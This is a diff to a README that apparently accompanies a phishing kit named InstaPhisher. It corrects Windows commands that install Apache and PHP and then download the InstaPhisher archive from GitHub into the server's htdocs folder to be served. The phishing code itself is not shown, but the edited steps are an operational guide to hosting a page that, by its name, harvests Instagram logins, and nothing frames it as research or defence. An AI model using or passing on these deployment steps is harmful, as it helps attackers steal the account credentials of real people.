@@ -51,31 +51,31 @@ video tutorial: https://www.youtube.com/watch?v=vb0vQYoeWt0
 
 1. Download apache-2.4
 ```
-Powershell.exe Invoke-WebRequest -Uri "https://www.apachelounge.com/download/VS16/binaries/httpd-2.4.43-win64-VS16.zip" -OutFile "%userprofile%\Download\httpd-2.4.43-win64-VS16.zip"
+Powershell.exe Invoke-WebRequest -Uri "https://www.apachelounge.com/download/VS16/binaries/httpd-2.4.43-win64-VS16.zip" -OutFile "%userprofile%\Downloads\httpd-2.4.43-win64-VS16.zip"
 ```
 
-2. Download Visual C++ (required for apache)
+2. Extract archive
 ```
-Powershell.exe Invoke-WebRequest -Uri "https://aka.ms/vs/16/release/VC_redist.x64.exe" -OutFile "%userprofile%\Download\VC_redist.x64.exe"
-start %userprofile%\Download\VC_redist.x64.exe
-```
-
-3. Extract archive
-```
-Powershell.exe Compress-Archive -Path "%userprofile%\Download\httpd-2.4.43-win64-VS16.zip" -DestinationPath "%userprofile%\Download\httpd-2.4.43-win64-VS16"
+Powershell.exe Expand-Archive -Path "%userprofile%\Downloads\httpd-2.4.43-win64-VS16.zip" -DestinationPath "%userprofile%\Downloads\httpd-2.4.43-win64-VS16"
 ```
 
-4. Move apache24 folder to C:\apache24
+3. Download Visual C++ (required for apache)
 ```
-cd %userprofile%\Download\httpd-2.4.43-win64-VS16
-move /Y %userprofile%\Download\httpd-2.4.43-win64-VS16\Apache24 C:\Apache24
+Powershell.exe Invoke-WebRequest -Uri "https://aka.ms/vs/16/release/VC_redist.x64.exe" -OutFile "%userprofile%\Downloads\VC_redist.x64.exe"
+start %userprofile%\Downloads\VC_redist.x64.exe
+```
+
+4. Move apache24 folder to C:\apache24. CMD in administrator.
+```
+cd %userprofile%\Downloads\httpd-2.4.43-win64-VS16
+move /Y %userprofile%\Downloads\httpd-2.4.43-win64-VS16\Apache24 C:\Apache24
 ```
 
 5. You must modify Apache24\conf\httpd.conf
 -	Open C:/Apache24/httpd.conf with notepad
 -	line 162: replace "#LoadModule rewrite_module modules/mod_rewrite.so" to "LoadModule rewrite_module modules/mod_rewrite.so"
 
-6. Install Apache, CMD in admin mode
+6. Install Apache, CMD in administrator mode. CMD in administrator.
 ```
 cd /Apache24/bin
 httpd -k install
@@ -83,20 +83,20 @@ httpd -k install
 
 7. Download php Thread Safe
 ```
-Powershell.exe Invoke-WebRequest -Uri "https://windows.php.net/downloads/qa/php-7.4.5RC1-Win32-vc15-x64.zip" -OutFile "%userprofile%\Download\php-7.4.5RC1-Win32-vc15-x64.zip"
+Powershell.exe Invoke-WebRequest -Uri "https://windows.php.net/downloads/qa/php-7.4.5RC1-Win32-vc15-x64.zip" -OutFile "%userprofile%\Downloads\php-7.4.5RC1-Win32-vc15-x64.zip"
 ```
 
 8. Extract archive
 ```
-Powershell.exe Compress-Archive -Path "%userprofile%\Download\php-7.4.5RC1-Win32-vc15-x64.zip" -DestinationPath "%userprofile%\Download\php"
+Powershell.exe Expand-Archive -Path "%userprofile%\Downloads\php-7.4.5RC1-Win32-vc15-x64.zip" -DestinationPath "%userprofile%\Downloads\php"
 ```
 
-9. Move all file in php-7.4.5RC1-Win32-vc15-x64 folder to C:\php
+9. Move all file in php-7.4.5RC1-Win32-vc15-x64 folder to C:\php. CMD in administrator.
 ```
-move /Y %userprofile%\Download\php C:\
+move /Y %userprofile%\Downloads\php C:\
 ```
 
-10. Rename C:/php/php.ini-development to C:/php/php.ini
+10. Rename C:/php/php.ini-development to C:/php/php.ini. CMD in administrator.
 ```
 rename C:\php\php.ini-development C:\php\php.ini
 ```
@@ -111,11 +111,11 @@ AddHandler application/x-httpd-php .php
 
 ## InstaPhisher download
 
-1. Download InstaPhisher, extract and move to apache server folder (apache24\htdocs).
+1. Download InstaPhisher, extract and move to apache server folder (apache24\htdocs). Cmd in administrator.
 ```
-Powershell.exe Invoke-WebRequest -Uri "https://github.com/ExilasP/InstaPhisher/archive/master.zip" -OutFile "%userprofile%\Download\InstaPhisher.zip"
-Powershell.exe Compress-Archive -Path "%userprofile%\Download\InstaPhisher.zip" -DestinationPath "%userprofile%\Download\InstaPhisher"
-move /Y %userprofile%\Download\InstaPhisher\* C:\Apache24\htdocs
+Powershell.exe Invoke-WebRequest -Uri "https://github.com/ExilasP/InstaPhisher/archive/master.zip" -OutFile "%userprofile%\Downloads\InstaPhisher.zip"
+Powershell.exe Expand-Archive -Path "%userprofile%\Downloads\InstaPhisher.zip" -DestinationPath "%userprofile%\Downloads\InstaPhisher"
+move /Y %userprofile%\Downloads\InstaPhisher\* C:\Apache24\htdocs
 ```
 
 # Notice
